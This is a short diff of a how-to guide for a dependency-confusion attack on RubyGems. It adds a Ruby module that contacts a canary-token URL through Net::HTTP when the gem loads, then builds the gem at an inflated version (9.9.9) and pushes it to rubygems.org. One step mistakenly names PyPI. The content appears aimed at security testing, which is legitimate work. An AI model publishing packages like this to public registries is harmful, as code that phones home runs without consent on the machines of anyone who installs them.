@@ -60,7 +60,35 @@ $ nano <package_name>.gem
    end
    ```
  - Save this file
+ 
+ ```bash
+ $ cd lib
+ ```
+ - Replaced -
     
+    ```bash
+    module Techghoshal
+       require 'net/http'
+       result = Net::HTTP.get(URI.parse('<canarytokens_url>'))
+    end
+    ```
+ - Save this file  
+ 
+ ```bash
+ $ cd ..
+ ```
+ ```bash
+ $ gem build <package_name>.gemspec
+ ```
+- Upload file publicly (https://pypi.org)
+
+- Create Accont on https://rubygems.org/
+    
+ ```bash
+ $ gem push <package_name>-9.9.9.gem 
+ ```
+  
+ 
  
     
     
